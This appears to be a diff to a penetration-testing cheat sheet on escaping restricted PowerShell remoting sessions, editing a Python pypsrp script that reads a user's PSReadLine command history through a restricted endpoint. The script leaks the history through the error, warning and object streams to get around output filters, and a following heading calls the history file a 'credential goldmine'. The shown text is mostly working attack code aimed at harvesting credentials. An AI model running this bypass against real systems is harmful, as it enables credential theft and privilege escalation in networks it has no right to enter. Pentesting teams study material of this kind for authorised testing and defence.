@@ -40,7 +40,6 @@ Enter-PSSession -ComputerName dc1.domain.local `
 Get-Command
 ```
 
-{% raw %}
 ```python title="Stream-leak bypass via pypsrp"
 # Use pypsrp to test multiple output streams
 from pypsrp.powershell import PowerShell, RunspacePool
@@ -54,23 +53,22 @@ HIST = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSRea
 with RunspacePool(wsman, configuration_name='restricted') as pool:
     # Method 1: throw as exception (error stream)
     ps = PowerShell(pool)
-    ps.add_script(f'&{{ $c = Get-Content "{HIST}" -Raw; throw $c }}')
+    ps.add_script('&{ $c = Get-Content "' + HIST + '" -Raw; throw $c }')
     ps.invoke()
     for e in ps.streams.error: print(str(e))
 
     # Method 2: Write-Warning (warning stream - often bypasses filter)
     ps = PowerShell(pool)
-    ps.add_script(f'&{{ $c = Get-Content "{HIST}" -Raw; Write-Warning $c }}')
+    ps.add_script('&{ $c = Get-Content "' + HIST + '" -Raw; Write-Warning $c }')
     ps.invoke()
     for w in ps.streams.warning: print(str(w))
 
     # Method 3: PSCustomObject (object stream)
     ps = PowerShell(pool)
-    ps.add_script(f'&{{ Get-Content "{HIST}" | ForEach-Object {{ [PSCustomObject]@{{Name=$_}} }} }}')
+    ps.add_script('&{ Get-Content "' + HIST + '" | ForEach-Object { [PSCustomObject]@{Name=$_} } }')
     output = ps.invoke()
     for o in output: print(o)
 ```
-{% endraw %}
 
 ```powershell title="PSReadLine history: credential goldmine"
 # Check history file first - contains commands with credentials
